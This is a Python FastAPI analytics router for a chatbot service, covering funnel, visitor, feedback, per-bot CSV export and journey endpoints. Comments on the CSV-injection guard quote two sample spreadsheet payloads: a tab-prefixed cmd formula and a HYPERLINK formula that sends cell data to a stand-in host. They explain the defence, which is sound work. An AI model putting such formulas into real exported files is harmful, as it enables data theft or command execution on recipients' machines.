import csv
import io
import logging
import re
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta

from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import StreamingResponse
from sqlalchemy import func, select

from app.api.auth import get_current_client_or_operator
from app.db.models import Bot, ChatMessage, ChatSession, MeetingBooking
from app.db.repository import (
    get_dashboard_stats,
    get_feedback_data,
    get_message_activity,
    get_ratings_summary,
    get_resolution_summary,
    get_top_questions,
    get_unanswered_questions,
    get_visitor_data,
)
from app.db.session import get_session
from app.services.plan_entitlements_service import UNLIMITED, get_chat_history_retention_days
from app.services.reporting_service import get_per_bot_rollup

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/analytics", tags=["analytics"])


def _verify_bot_ownership(bot_id: int | None, client_id: int) -> None:
    """Raise 404 if bot_id is provided but does not belong to client_id."""
    if bot_id is None:
        return
    with get_session() as session:
        owned = session.execute(select(Bot.id).where(Bot.id == bot_id, Bot.client_id == client_id)).scalar_one_or_none()
        if not owned:
            raise HTTPException(status_code=404, detail="Bot not found.")


@router.get("/qualification-funnel")
def get_qualification_funnel(
    bot_id: int = Query(...),
    period: str = Query("30d", description="7d|30d|90d|all"),
    auth: dict = Depends(get_current_client_or_operator),
):
    try:
        if period not in {"7d", "30d", "90d", "all"}:
            raise HTTPException(status_code=422, detail="Invalid period. Use one of: 7d, 30d, 90d, all.")

        with get_session() as session:
            owned = session.execute(
                select(Bot.id).where(Bot.id == bot_id, Bot.client_id == auth["client_id"])
            ).scalar_one_or_none()
            if not owned:
                raise HTTPException(status_code=404, detail="Bot not found.")

            base_stmt = select(ChatSession.id, ChatSession.behavioral_score, ChatSession.bant_tier).where(
                ChatSession.bot_id == bot_id
            )

            # Compute the "start of window" cutoff once so it's in scope for
            # the meeting-booking count below as well — previously ``since``
            # only existed inside the base_stmt narrowing block, and reading
            # it under the second ``if period != "all"`` triggered an
            # unbound-name diagnostic (safe at runtime because both blocks
            # gate on the same condition, but the type-checker can't see
            # that).
            since: datetime | None = None
            if period != "all":
                days = {"7d": 7, "30d": 30, "90d": 90}[period]
                since = datetime.now(UTC) - timedelta(days=days)
                base_stmt = base_stmt.where(ChatSession.created_at >= since)

            sessions = session.execute(base_stmt).all()
            session_ids = [row.id for row in sessions]

            message_counts = {}
            if session_ids:
                msg_rows = session.execute(
                    select(ChatMessage.session_id, func.count(ChatMessage.id))
                    .where(ChatMessage.session_id.in_(session_ids))
                    .group_by(ChatMessage.session_id)
                ).all()
                message_counts = {sid: count for sid, count in msg_rows}

            total_visitors = len(sessions)
            engaged = sum(
                1
                for row in sessions
                if (int(row.behavioral_score or 0) > 0) or (int(message_counts.get(row.id, 0)) > 1)
            )
            mql = sum(1 for row in sessions if (row.bant_tier or "unqualified") in {"mql", "sal", "sql"})
            sal = sum(1 for row in sessions if (row.bant_tier or "unqualified") in {"sal", "sql"})
            sql = sum(1 for row in sessions if (row.bant_tier or "unqualified") == "sql")

            meeting_stmt = select(func.count(MeetingBooking.id)).where(MeetingBooking.bot_id == bot_id)
            if period != "all" and since is not None:
                meeting_stmt = meeting_stmt.where(MeetingBooking.created_at >= since)
            meetings_booked = int(session.execute(meeting_stmt).scalar_one() or 0)

            stages = [
                ("total_visitors", total_visitors),
                ("engaged", engaged),
                ("mql", mql),
                ("sal", sal),
                ("sql", sql),
                ("meetings_booked", meetings_booked),
            ]

            funnel = []
            previous = None
            for stage, count in stages:
                if previous is None:
                    rate = 100.0 if count > 0 else 0.0
                elif previous <= 0:
                    rate = 0.0
                else:
                    rate = round((count / previous) * 100, 2)
                funnel.append({"stage": stage, "count": count, "conversion_rate_from_previous": rate})
                previous = count

            return {"funnel": funnel, "period": period, "bot_id": bot_id}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch qualification funnel: {e}")
        raise HTTPException(status_code=500, detail="Failed to load qualification funnel.") from e


@router.get("/dashboard")
def get_dashboard_analytics_endpoint(
    bot_id: int | None = Query(None),
    days: int | None = Query(None, ge=1, le=365, description="Restrict stats to the last N days"),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Retrieve live aggregate statistics for the admin dashboard."""
    try:
        _verify_bot_ownership(bot_id, auth["client_id"])
        with get_session() as session:
            stats = get_dashboard_stats(session, client_id=auth["client_id"], bot_id=bot_id, days=days)
            return stats
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch dashboard stats: {e}")
        raise HTTPException(status_code=500, detail="Failed to load dashboard statistics.") from e


@router.get("/activity")
def get_activity_analytics_endpoint(
    bot_id: int | None = Query(None),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Retrieve message activity over time for charts."""
    try:
        _verify_bot_ownership(bot_id, auth["client_id"])
        with get_session() as session:
            activity = get_message_activity(session, client_id=auth["client_id"], bot_id=bot_id)
            return activity
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch activity stats: {e}")
        raise HTTPException(status_code=500, detail="Failed to load activity data.") from e


@router.get("/top-questions")
def get_top_questions_endpoint(
    bot_id: int | None = Query(None),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Retrieve the most common user queries."""
    try:
        _verify_bot_ownership(bot_id, auth["client_id"])
        with get_session() as session:
            top_questions = get_top_questions(session, client_id=auth["client_id"], bot_id=bot_id)
            return top_questions
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch top questions: {e}")
        raise HTTPException(status_code=500, detail="Failed to load top questions.") from e


@router.get("/unanswered-questions")
def get_unanswered_questions_endpoint(
    bot_id: int | None = Query(None),
    limit: int = Query(50, ge=1, le=200),
    days: int | None = Query(None, ge=1, le=365, description="Restrict to a trailing window of N days."),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Knowledge gaps: the questions the bot could not answer from its content.

    Each result is a distinct question the visitor asked when retrieval found
    nothing usable (the no-info pivot), with how often it was asked and when it
    was last seen - so the customer knows which documents to add.
    """
    try:
        _verify_bot_ownership(bot_id, auth["client_id"])
        with get_session() as session:
            return get_unanswered_questions(session, client_id=auth["client_id"], bot_id=bot_id, limit=limit, days=days)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch unanswered questions: {e}")
        raise HTTPException(status_code=500, detail="Failed to load unanswered questions.") from e


@router.get("/visitors")
def get_visitors_endpoint(
    bot_id: int | None = Query(None),
    limit: int = Query(500, ge=1, le=1000),
    offset: int = Query(0, ge=0),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Retrieve visitor sessions for the admin dashboard (most-recent first, paginated)."""
    try:
        _verify_bot_ownership(bot_id, auth["client_id"])
        with get_session() as session:
            # Plan-driven chat-history retention. A Free customer with a
            # 7-day cap only sees conversations from the last week; unlimited
            # plans (Professional, and defensively any lookup failure) pass
            # ``None`` so no time filter is applied.
            retention_days = get_chat_history_retention_days(auth["client_id"], session)
            created_after = datetime.now(UTC) - timedelta(days=retention_days) if retention_days != UNLIMITED else None
            data = get_visitor_data(
                session,
                client_id=auth["client_id"],
                bot_id=bot_id,
                limit=limit,
                offset=offset,
                created_after=created_after,
            )

            unique_visitors = {}
            current_user_index = 1

            for item in data:
                raw_loc = item.get("location", "") or "Unknown"
                ip_part = raw_loc
                display_loc = raw_loc
                if " | " in raw_loc:
                    display_loc, ip_part = raw_loc.split(" | ", 1)
                elif raw_loc.startswith("IP: "):
                    ip_part = raw_loc
                    display_loc = "Unknown"

                fingerprint = f"{ip_part}--{item.get('device', '')}"

                if fingerprint not in unique_visitors:
                    item["visitor"] = f"user{current_user_index}"
                    current_user_index += 1
                    item["all_session_ids"] = [item.get("session_id")]
                    item["location"] = display_loc
                    unique_visitors[fingerprint] = item
                else:
                    existing = unique_visitors[fingerprint]
                    existing["chats"] += item.get("chats", 0)
                    existing["all_session_ids"].append(item.get("session_id"))
                    if (
                        item.get("last_active_at")
                        and existing.get("last_active_at")
                        and item["last_active_at"] > existing["last_active_at"]
                    ):
                        existing["last_active_at"] = item["last_active_at"]

            result_list = list(unique_visitors.values())
            for user in result_list:
                user["session_id"] = ",".join(user["all_session_ids"])

            return sorted(result_list, key=lambda x: x["last_active_at"], reverse=True)

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch visitors: {e}")
        raise HTTPException(status_code=500, detail="Failed to load visitor data.") from e


@router.get("/ratings-summary")
def get_ratings_summary_endpoint(
    bot_id: int | None = Query(None),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Retrieve post-chat visitor rating summary (avg, total, distribution)."""
    try:
        _verify_bot_ownership(bot_id, auth["client_id"])
        with get_session() as session:
            return get_ratings_summary(session, client_id=auth["client_id"], bot_id=bot_id)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch ratings summary: {e}")
        raise HTTPException(status_code=500, detail="Failed to load ratings summary.") from e


@router.get("/resolution-summary")
def get_resolution_summary_endpoint(
    bot_id: int | None = Query(None),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Retrieve post-chat visitor resolution summary (resolved, unresolved, rate)."""
    try:
        _verify_bot_ownership(bot_id, auth["client_id"])
        with get_session() as session:
            return get_resolution_summary(session, client_id=auth["client_id"], bot_id=bot_id)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch resolution summary: {e}")
        raise HTTPException(status_code=500, detail="Failed to load resolution summary.") from e


@router.get("/feedback")
def get_feedback_endpoint(
    bot_id: int | None = Query(None),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Retrieve all feedback for the admin dashboard."""
    try:
        _verify_bot_ownership(bot_id, auth["client_id"])
        with get_session() as session:
            data = get_feedback_data(session, client_id=auth["client_id"], bot_id=bot_id)

            session_to_user_map = {}
            current_user_index = 1

            for item in data:
                sid = item["session_id"]
                if sid not in session_to_user_map:
                    session_to_user_map[sid] = f"User -{current_user_index}"
                    current_user_index += 1

                item["user"] = session_to_user_map[sid]
                del item["session_id"]

            return sorted(data, key=lambda x: x["created_at"], reverse=True)

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch feedback logs: {e}")
        raise HTTPException(status_code=500, detail="Failed to load feedback data.") from e


@router.get("/by-bot")
def get_per_bot_rollup_endpoint(
    days: int = Query(30, ge=1, le=365, description="Trailing window of N days"),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Per-bot activity rollup for the account: credits, conversations, leads.

    Built for the agency case — many client sites on one account, one shared
    credit pool — so each bot's spend is read from the ledger's
    ``attributed_bot_id`` and stays correct even when the deduction came out
    of the pool. Bots with no activity in the window are omitted.
    """
    try:
        until = datetime.now(UTC)
        since = until - timedelta(days=days)
        with get_session() as session:
            rows = get_per_bot_rollup(session, client_id=auth["client_id"], since=since, until=until)

        return {
            "since": since.isoformat(),
            "until": until.isoformat(),
            "rows": rows,
            "totals": {
                "credits_spent": sum(row["credits_spent"] for row in rows),
                "conversations": sum(row["conversations"] for row in rows),
                "leads": sum(row["leads"] for row in rows),
            },
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to fetch per-bot rollup: {e}")
        raise HTTPException(status_code=500, detail="Failed to load per-bot rollup.") from e


# ─── Per-bot report CSV ──────────────────────────────────────────────────────

_CSV_HEADER: tuple[str, ...] = ("Agent", "Conversations", "Leads", "Credits used")

# Leading characters that make a spreadsheet treat a cell as a formula rather
# than as text. ``=`` and ``@`` start a formula outright; ``+``/``-`` start a
# signed expression; a leading TAB or CR is stripped by Excel before it makes
# that decision, so ``\t=cmd|'/c calc'!A0`` slips a formula past a naive
# first-character check. OWASP's CSV-injection list, in full.
_CSV_FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe(value: str | None) -> str:
    """Neutralise a spreadsheet formula hiding in a customer-controlled string.

    Agent names are typed by the customer and land verbatim in a file that an
    agency then forwards to *their* client, who opens it in Excel. An agent
    named ``=HYPERLINK("https://evil.test/?"&A2,"Click")`` would execute on
    open — data exfiltration on a machine that never touched OyeChats.

    The fix is to stop the cell from ever *starting* with a formula trigger:
    prefix it with a single quote, which every spreadsheet reads as "the rest
    of this cell is literal text". The quote stays visible when a CSV is opened
    directly (unlike a typed cell, where it is consumed as a formatting hint) —
    a deliberate trade of cosmetics for not executing attacker input. Quoting
    alone would not do: Excel evaluates ``"=1+1"`` just the same, so RFC-4180
    escaping (which ``csv.writer`` already applies for delimiters, quotes and
    newlines) is a separate concern from this one.

    Only the agent name needs this. The other three columns are integers this
    service computed, never strings a customer supplied.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_CSV_FORMULA_PREFIXES) else text


@router.get("/by-bot.csv")
def get_per_bot_rollup_csv(
    days: int = Query(30, ge=1, le=365, description="Trailing window of N days"),
    auth: dict = Depends(get_current_client_or_operator),
):
    """The ``/analytics/by-bot`` rollup as a downloadable CSV.

    Same window and same auth as the JSON endpoint — an agency owner pulls one
    file per reporting period and forwards it to the client it covers, so the
    filename carries the window (``oyechats-report-2026-07-14-to-2026-08-13.csv``)
    and the rows arrive in the same order the dashboard shows them.

    No totals row: a trailing aggregate in a CSV double-counts the moment
    anyone pivots or concatenates it, and a bot legitimately named "Total"
    would be indistinguishable from it. The dashboard renders the totals.
    """
    try:
        until = datetime.now(UTC)
        since = until - timedelta(days=days)
        # Materialise before streaming: the response body is produced after
        # this handler returns, by which point the session context manager has
        # already closed. ``get_per_bot_rollup`` returns plain dicts, so there
        # is nothing lazy left to resolve.
        with get_session() as session:
            rows = get_per_bot_rollup(session, client_id=auth["client_id"], since=since, until=until)

        filename = f"oyechats-report-{since:%Y-%m-%d}-to-{until:%Y-%m-%d}.csv"

        def stream_csv() -> Iterator[str]:
            buffer = io.StringIO()
            writer = csv.writer(buffer)

            def flush() -> str:
                chunk = buffer.getvalue()
                buffer.seek(0)
                buffer.truncate(0)
                return chunk

            writer.writerow(_CSV_HEADER)
            yield flush()
            for row in rows:
                writer.writerow(
                    [
                        _csv_safe(row["bot_name"]),
                        row["conversations"],
                        row["leads"],
                        row["credits_spent"],
                    ]
                )
                yield flush()

        return StreamingResponse(
            stream_csv(),
            media_type="text/csv",
            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
        )
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Failed to export per-bot rollup CSV: {e}")
        raise HTTPException(status_code=500, detail="Failed to export the per-agent report.") from e


# ─── Journeys view ───────────────────────────────────────────────────────────
#
# Read endpoints backing the Journeys tab under Analytics. Data collection
# is unconditional (widget always POSTs); these reads are gated by the
# ``journey_analytics`` plan flag. Free/Starter clients get 402
# ("upgrade required") and the UI renders an upsell card.

_JOURNEY_PHASES = {"pre", "chat", "post"}

# ``period`` for Journeys is a UTC calendar month expressed as ``YYYY-MM``.
# The Journeys tab does month-over-month reporting, so bounding by exact
# calendar month (1st at 00:00 UTC through the last microsecond) is more
# useful than rolling day windows. Legacy rolling values (``7d``/``30d``/
# ``90d``) are no longer accepted here — reject at the edge with 422.
_JOURNEY_PERIOD_RE = re.compile(r"^(\d{4})-(0[1-9]|1[0-2])$")
_JOURNEY_MIN_YEAR = 2020


def _resolve_journey_window(period: str) -> tuple[datetime, datetime]:
    """Translate a ``YYYY-MM`` period into a UTC ``(since, until)`` window.

    ``until`` for the current month clamps to ``now`` so we don't quote
    counts from the future; for prior months it lands on the last
    microsecond of that month. ``since`` is always the 1st of the month
    at 00:00 UTC.
    """
    match = _JOURNEY_PERIOD_RE.match(period)
    if not match:
        raise HTTPException(
            status_code=422,
            detail="Invalid period. Use YYYY-MM (e.g. 2026-08).",
        )
    year, month = int(match.group(1)), int(match.group(2))
    now = datetime.now(UTC)
    # Reject impossibly-old or future months so the empty case in the UI
    # is a real "no data" state rather than a resolver quirk.
    if year < _JOURNEY_MIN_YEAR or (year, month) > (now.year, now.month):
        raise HTTPException(
            status_code=422,
            detail="Period out of range.",
        )
    since = datetime(year, month, 1, 0, 0, 0, 0, tzinfo=UTC)
    # Next month's 1st, then step back one microsecond for the inclusive
    # upper bound of the requested month. For the current month, clamp
    # to ``now`` so we don't count into the future.
    next_month = since.replace(year=year + 1, month=1) if month == 12 else since.replace(month=month + 1)
    until = min(next_month - timedelta(microseconds=1), now)
    return since, until


def _guard_journey_access(bot_id: int, client_id: int) -> None:
    """Verify bot ownership AND the journey_analytics plan gate."""
    from app.services.plan_entitlements_service import is_journey_analytics_enabled_for_bot

    _verify_bot_ownership(bot_id, client_id)
    with get_session() as session:
        if not is_journey_analytics_enabled_for_bot(bot_id, session):
            raise HTTPException(
                status_code=402,
                detail="Journeys analytics require a Standard or Professional plan.",
            )


@router.get("/journey/summary")
def get_journey_summary(
    bot_id: int = Query(...),
    period: str = Query(..., description="Calendar month as YYYY-MM (e.g. 2026-08)"),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Header-row totals: sessions with journey + per-conversion counts + leads."""
    try:
        from app.services.journey_analytics_service import summary_counts

        _guard_journey_access(bot_id, auth["client_id"])
        since, until = _resolve_journey_window(period)
        with get_session() as session:
            return summary_counts(session, bot_id=bot_id, since=since, until=until)
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Journey summary failed: {e}")
        raise HTTPException(status_code=500, detail="Failed to load journey summary.") from e


@router.get("/journey/top-pages")
def get_journey_top_pages(
    bot_id: int = Query(...),
    period: str = Query(..., description="Calendar month as YYYY-MM (e.g. 2026-08)"),
    phase: str | None = Query(None, description="pre|chat|post; omit for all"),
    limit: int = Query(20, ge=1, le=100),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Ranked pages by distinct-session visits, optionally scoped by phase."""
    try:
        from app.services.journey_analytics_service import top_pages

        if phase is not None and phase not in _JOURNEY_PHASES:
            raise HTTPException(status_code=422, detail="Invalid phase. Use pre|chat|post.")
        _guard_journey_access(bot_id, auth["client_id"])
        since, until = _resolve_journey_window(period)
        with get_session() as session:
            rows = top_pages(session, bot_id=bot_id, since=since, until=until, phase=phase, limit=limit)
        return {"period": period, "phase": phase, "rows": rows}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Journey top-pages failed: {e}")
        raise HTTPException(status_code=500, detail="Failed to load top pages.") from e


@router.get("/journey/conversion-paths")
def get_journey_conversion_paths(
    bot_id: int = Query(...),
    conversion_type: str = Query(..., description="meeting_booked|handoff_requested|offline_message_sent"),
    period: str = Query(..., description="Calendar month as YYYY-MM (e.g. 2026-08)"),
    limit: int = Query(10, ge=1, le=50),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Top pre-chat page sequences that preceded a given conversion event."""
    try:
        from app.services.journey_analytics_service import (
            CONVERSION_EVENTS,
            paths_to_conversion,
        )

        if conversion_type not in CONVERSION_EVENTS:
            raise HTTPException(
                status_code=422,
                detail="Invalid conversion_type. Use one of: meeting_booked, handoff_requested, offline_message_sent.",
            )
        _guard_journey_access(bot_id, auth["client_id"])
        since, until = _resolve_journey_window(period)
        with get_session() as session:
            data = paths_to_conversion(
                session,
                bot_id=bot_id,
                conversion_type=conversion_type,
                since=since,
                until=until,
                limit=limit,
            )
        return {"period": period, **data}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Journey conversion-paths failed: {e}")
        raise HTTPException(status_code=500, detail="Failed to load conversion paths.") from e


@router.get("/journey/post-chat")
def get_journey_post_chat(
    bot_id: int = Query(...),
    period: str = Query(..., description="Calendar month as YYYY-MM (e.g. 2026-08)"),
    limit: int = Query(10, ge=1, le=50),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Where visitors go after the chat closes — first hops + full sequences."""
    try:
        from app.services.journey_analytics_service import post_chat_destinations

        _guard_journey_access(bot_id, auth["client_id"])
        since, until = _resolve_journey_window(period)
        with get_session() as session:
            data = post_chat_destinations(session, bot_id=bot_id, since=since, until=until, limit=limit)
        return {"period": period, **data}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Journey post-chat failed: {e}")
        raise HTTPException(status_code=500, detail="Failed to load post-chat destinations.") from e


@router.get("/journey/pre-chat-sequences")
def get_journey_pre_chat_sequences(
    bot_id: int = Query(...),
    period: str = Query(..., description="Calendar month as YYYY-MM (e.g. 2026-08)"),
    limit: int = Query(5, ge=1, le=50),
    auth: dict = Depends(get_current_client_or_operator),
):
    """Top pre-chat page sequences across every session (converted or not).

    Powers the flow-diagram source rows on the Journey1 experiment: rather
    than a bag of independent source pages, owners see the actual chained
    Home → About → Contact patterns visitors took before opening chat.
    """
    try:
        from app.services.journey_analytics_service import top_pre_chat_sequences

        _guard_journey_access(bot_id, auth["client_id"])
        since, until = _resolve_journey_window(period)
        with get_session() as session:
            data = top_pre_chat_sequences(session, bot_id=bot_id, since=since, until=until, limit=limit)
        return {"period": period, **data}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Journey pre-chat-sequences failed: {e}")
        raise HTTPException(status_code=500, detail="Failed to load pre-chat sequences.") from e
